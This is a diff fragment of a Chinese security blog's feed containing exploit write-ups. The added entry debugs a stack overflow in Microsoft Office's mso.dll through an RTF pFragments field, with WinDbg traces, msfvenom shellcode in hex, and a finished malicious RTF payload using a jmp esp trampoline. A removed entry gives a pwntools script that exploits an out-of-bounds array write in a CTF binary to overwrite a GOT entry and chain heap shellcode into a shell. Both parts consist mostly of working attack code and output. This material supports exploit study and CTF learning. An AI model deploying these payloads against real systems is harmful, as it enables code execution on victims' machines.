+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x640:
+30e9eb7b 0faf742414      imul    esi,dword ptr [esp+14h] ss:0023:00123dac=00000000
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=00000000 edi=00123dc0
+eip=30e9eb80 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x645:
+30e9eb80 037010          add     esi,dword ptr [eax+10h] ds:0023:014d1100=1104000c
+0:000&gt; t
+eax=014d10f0 ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123dc0
+eip=30e9eb83 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x648:
+30e9eb83 8bc1            mov     eax,ecx
+0:000&gt; t
+eax=0000c8ac ebx=05000000 ecx=0000c8ac edx=00000000 esi=1104000c edi=00123dc0
+eip=30e9eb85 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x64a:
+30e9eb85 c1e902          shr     ecx,2
+0:000&gt; t
+eax=0000c8ac ebx=05000000 ecx=0000322b edx=00000000 esi=1104000c edi=00123dc0
+eip=30e9eb88 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal6426+0x64d:
+30e9eb88 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+</code></pre>
+<p>可以看到ecx=0000c8ac，及复制数据的大小，由于操作dword字节，因此要除以4</p>
+<pre><code>0:000&gt; db esi
+1104000c  41 61 30 41 61 31 41 61-32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A
+1104001c  61 35 41 61 36 41 61 37-41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab
+1104002c  30 41 62 31 41 62 32 41-62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5
+1104003c  41 62 36 41 62 37 41 62-38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A
+1104004c  63 31 41 63 32 41 63 33-41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac
+1104005c  36 41 63 37 41 63 38 41-63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1
+1104006c  41 64 32 41 64 33 41 64-34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A
+1104007c  64 37 41 64 38 41 64 39-41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae
+</code></pre>
+<p>可以看到目标地址edi与ebp刚好相差0x10，因为复制的内存过大，可以覆盖返回地址</p>
+<p>没复制时</p>
+<pre><code>0:000&gt; dp ebp
+00123dd0  00123e00 30f4cdbd 00123f3c 00000000
+00123de0  ffffffff 00000000 014d14e0 00124420
+00123df0  0012408c 00124e38 001240b0 00000000
+00123e00  00123fe4 30f4a597 00123f88 00123f3c
+00123e10  00000000 014d14e0 0012408c 00124420
+00123e20  00000000 ffffffff ffffffff ffffffff
+00123e30  00000000 20000000 00000101 00000000
+00123e40  ffffffff ffffffff ffffffff 00000000
+</code></pre>
+<p>复制后</p>
+<pre><code>0:000&gt; dp 00123dc0
+00123dc0  41306141 61413161 33614132 41346141
+00123dd0  61413561 37614136 41386141 62413961#ebp处的值已被覆盖，
+00123de0  31624130 41326241 62413362 35624134
+00123df0  41366241 62413762 39624138 41306341
+00123e00  63413163 33634132 41346341 63413563
+00123e10  37634136 41386341 64413963 31644130
+00123e20  41326441 64413364 35644134 41366441
+00123e30  64413764 39644138 41306541 65413165
+</code></pre>
+<p>用msfvenole编写payload</p>
+<pre><code>msf5 &gt; msfvenom -a x86 -p windows/exec cmd=calc.exe -f hex
+[*] exec: msfvenom -a x86 -p windows/exec cmd=calc.exe -f hex
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 193 bytes
+Final size of hex file: 386 bytes
+fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b20000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd563616c632e65786500
+</code></pre>
+<pre><code>{\rtf1{\shp{\sp{\sn pFragments}{\sv 3;1;111111110010
+4161304161314161324161334161344161354161c83ad977
+0000000000000000000000000000000000000000
+fce8820000006089e531c0648b50308b520c8b52148b72280f
+b74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c
+8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf
+0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d3
+8b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6a018d85b2
+0000005068318b6f87ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe0
+7505bb4713726f6a0053ffd563616c632e65786500}}}}
+</code></pre>
+<p>这里采用的是跳板jmp esp，地址为0x77d93ac8</p>
+<pre><code>30e9eb8f f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=0d3a100c edi=00124dc0
+eip=30e9eb91 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x656:
+30e9eb91 5e              pop     esi
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00124dc0
+eip=30e9eb92 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x657:
+30e9eb92 5f              pop     edi
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30e9eb93 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x658:
+30e9eb93 c20c00          ret     0Ch
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc96 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f47:
+30f4cc96 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:00123de4=67666564
+0:000&gt; p
+eax=67666564 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc99 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f4a:
+30f4cc99 ff7518          push    dword ptr [ebp+18h]  ss:0023:00123de8=61006968
+0:000&gt; p
+eax=67666564 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc9c esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f4d:
+30f4cc9c 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:00123dc0=41306141
+0:000&gt; p
+eax=67666564 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cc9f esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f50:
+30f4cc9f f7d8            neg     eax
+0:000&gt; p
+eax=98999a9c ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca1 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+mso!Ordinal753+0x2f52:
+30f4cca1 1bc0            sbb     eax,eax
+0:000&gt; p
+eax=ffffffff ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca3 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+mso!Ordinal753+0x2f54:
+30f4cca3 8d4df8          lea     ecx,[ebp-8]
+0:000&gt; p
+eax=ffffffff ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca6 esp=00123dac ebp=00123dd0 iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+mso!Ordinal753+0x2f57:
+30f4cca6 23c1            and     eax,ecx
+0:000&gt; p
+eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca8 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f59:
+30f4cca8 50              push    eax
+0:000&gt; p
+eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca9 esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f5a:
+30f4cca9 ff7508          push    dword ptr [ebp+8]    ss:0023:00123dd8=64636261
+0:000&gt; p
+eax=00123dc8 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ccac esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+mso!Ordinal753+0x2f5d:
+30f4ccac e86cfeffff      call    mso!Ordinal753+0x2dce (30f4cb1d)
+0:000&gt; p
+(1a0.624): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=3a77d858 ebx=00000000 ecx=00123d90 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ce4a esp=00123d88 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+mso!Ordinal753+0x30fb:
+30f4ce4a 8b5004          mov     edx,dword ptr [eax+4] ds:0023:3a77d85c=????????
+0:000&gt; p
+eax=3a77d858 ebx=00000000 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
+eip=7c92e460 esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+ntdll!KiUserExceptionDispatcher+0x4:
+7c92e460 8b1c24          mov     ebx,dword ptr [esp]  ss:0023:00123a98=00123aa0
+0:000&gt; p
+eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
+eip=7c92e463 esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+ntdll!KiUserExceptionDispatcher+0x7:
+7c92e463 51              push    ecx
+0:000&gt; p
+eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
+eip=7c92e464 esp=00123a94 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+ntdll!KiUserExceptionDispatcher+0x8:
+7c92e464 53              push    ebx
+0:000&gt; p
+eax=3a77d858 ebx=00123aa0 ecx=00123abc edx=41306141 esi=014d10f0 edi=00123f88
+eip=7c92e465 esp=00123a90 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+ntdll!KiUserExceptionDispatcher+0x9:
+7c92e465 e8e6c40100      call    ntdll!towlower+0x12a (7c94a950)
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e46a esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0xe:
+7c92e46a 0ac0            or      al,al
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e46c esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x10:
+7c92e46c 740c            je      ntdll!KiUserExceptionDispatcher+0x1e (7c92e47a) [br=1]
+</code></pre>
+<pre><code>eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e47a esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x1e:
+7c92e47a 5b              pop     ebx
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00000000 edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e47b esp=00123a9c ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x1f:
+7c92e47b 59              pop     ecx
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e47c esp=00123aa0 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x20:
+7c92e47c 6a00            push    0
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e47e esp=00123a9c ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x22:
+7c92e47e 51              push    ecx
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e47f esp=00123a98 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x23:
+7c92e47f 53              push    ebx
+0:000&gt; p
+eax=00000000 ebx=00123aa0 ecx=00123abc edx=7c92e4f4 esi=014d10f0 edi=00123f88
+eip=7c92e480 esp=00123a94 ebp=00123d9c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+ntdll!KiUserExceptionDispatcher+0x24:
+7c92e480 e80bf5ffff      call    ntdll!ZwRaiseException (7c92d990)
+0:000&gt; p
+(1a0.624): Access violation - code c0000005 (!!! second chance !!!)
+eax=3a77d858 ebx=00000000 ecx=00123d90 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ce4a esp=00123d88 ebp=00123d9c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+mso!Ordinal753+0x30fb:
+30f4ce4a 8b5004          mov     edx,dword ptr [eax+4] ds:0023:3a77d85c=????????
+</code></pre>
+<p>可以发现在这里出错了，因此需要跳过je就直接结束</p>
+<p>这里先mov     eax,dword ptr [ebp+14h] ，neg     eax求补，</p>
+<pre><code>30e9eb8f f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=0d39100c edi=00124dc0
+eip=30e9eb91 esp=00123d98 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x656:
+30e9eb91 5e              pop     esi
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00124dc0
+eip=30e9eb92 esp=00123d9c ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x657:
+30e9eb92 5f              pop     edi
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30e9eb93 esp=00123da0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal6426+0x658:
+30e9eb93 c20c00          ret     0Ch
+0:000&gt; p
+eax=00001000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc96 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f47:
+30f4cc96 8b4514          mov     eax,dword ptr [ebp+14h] ss:0023:00123de4=00000000
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc99 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f4a:
+30f4cc99 ff7518          push    dword ptr [ebp+18h]  ss:0023:00123de8=00000000
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00000000 edx=00000000 esi=014d10f0 edi=00123f88
+eip=30f4cc9c esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f4d:
+30f4cc9c 8b55f0          mov     edx,dword ptr [ebp-10h] ss:0023:00123dc0=41306141
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cc9f esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f50:
+30f4cc9f f7d8            neg     eax
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca1 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f52:
+30f4cca1 1bc0            sbb     eax,eax
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00000000 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca3 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f54:
+30f4cca3 8d4df8          lea     ecx,[ebp-8]
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca6 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f57:
+30f4cca6 23c1            and     eax,ecx
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca8 esp=00123dac ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f59:
+30f4cca8 50              push    eax
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cca9 esp=00123da8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f5a:
+30f4cca9 ff7508          push    dword ptr [ebp+8]    ss:0023:00123dd8=00000000
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=00123dc8 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ccac esp=00123da4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f5d:
+30f4ccac e86cfeffff      call    mso!Ordinal753+0x2dce (30f4cb1d)
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ccb1 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f62:
+30f4ccb1 84c0            test    al,al
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4ccb3 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x2f64:
+30f4ccb3 0f8498000000    je      mso!Ordinal753+0x3002 (30f4cd51)        [br=1]
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=014d10f0 edi=00123f88
+eip=30f4cd51 esp=00123db0 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x3002:
+30f4cd51 5e              pop     esi
+0:000&gt; p
+eax=00000000 ebx=05000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00123f88
+eip=30f4cd52 esp=00123db4 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x3003:
+30f4cd52 5b              pop     ebx
+0:000&gt; p
+eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00123f88
+eip=30f4cd53 esp=00123db8 ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x3004:
+30f4cd53 5f              pop     edi
+0:000&gt; p
+eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00000000
+eip=30f4cd54 esp=00123dbc ebp=00123dd0 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x3005:
+30f4cd54 c9              leave
+0:000&gt; p
+eax=00000000 ebx=00000000 ecx=e0040057 edx=41306141 esi=00000000 edi=00000000
+eip=30f4cd55 esp=00123dd4 ebp=61413561 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+mso!Ordinal753+0x3006:
+30f4cd55 c21400          ret     14h
+</code></pre>
+<p>可以看到在call    mso!Ordinal753+0x2dce (30f4cb1d)这后面开始出现分歧了</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[攻击 _IO_2_1_stdin_绕过对输入字节的限制]]></title>
         <id>https://czh11.github.io/post/gong-ji-_io_2_1_stdin_-rao-guo-dui-shu-ru-zi-jie-de-xian-zhi/</id>
@@ -1911,86 +2719,6 @@ r.recv()
 r.shutdown('send')
 r.interactive()
 r.close
-</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ctfpwn 一道数组越界的堆题]]></title>
-        <id>https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/</id>
-        <link href="https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/">
-        </link>
-        <updated>2020-11-19T13:44:23.000Z</updated>
-        <content type="html"><![CDATA[<!-- more -->
-<p><img src="https://czh11.github.io/post-images/1605793554457.png" alt="" loading="lazy"><br>
-没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
-<img src="https://czh11.github.io/post-images/1605793729793.jpg" alt="" loading="lazy"><br>
-没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
-<figure data-type="image" tabindex="1"><img src="https://czh11.github.io/post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
-<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
-<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
-<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
-<figure data-type="image" tabindex="2"><img src="https://czh11.github.io/post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="3"><img src="https://czh11.github.io/post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
-<pre><code>#!/usr/bin/env python2
-#-*- coding:utf-8 -*
-from pwn import *
-p=process(&quot;./note-service2&quot;)
-#p=remote(&quot;220.249.52.133&quot;,42490)
-elf=ELF(&quot;./note-service2&quot;)
-print(hex(elf.got['free']))
-context.log_level='debug'
-context.arch='amd64'
-def add(index,content):
-    p.recvuntil('your choice&gt;&gt;')
-    p.sendline('1')
-    p.recvuntil('index')
-    p.sendline(str(index))
-    p.recvuntil('size')
-    p.sendline(str(8))    
-    p.recvuntil('content')
-    p.send(content)
-
-def delete(index):
-	p.recvuntil('your choice&gt;&gt;')
-	p.sendline('4')
-	p.recvuntil('index:')
-	p.sendline(str(index))
-
-&quot;&quot;&quot;
-;64位系统调用
-mov rdi,xxxx;&quot;/bin/sh&quot;的地址
-mov rax,0x3b;execve系统调用号
-mov rsi,0
-mov rdx,0
-sycall
-&quot;&quot;&quot;
-gdb.attach(p)
-add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
-add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
-#把got表中free函数的指针覆盖为第二个chunk的指针
-#然后在第二个chunk中写入
-#xor rsi,rsi
-#nop
-#nop
-#jmp 0x19
-add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
-#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
-#push 0x3b
-#pop rax
-#nop
-#nop
-#jmp 0x19
-add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
-#
-add(3,asm('syscall')+'\x90'*5)
-
-delete(0)
-#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
-#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
-#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
-#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
-
-p.interactive()
 </code></pre>
 ]]></content>
     </entry>
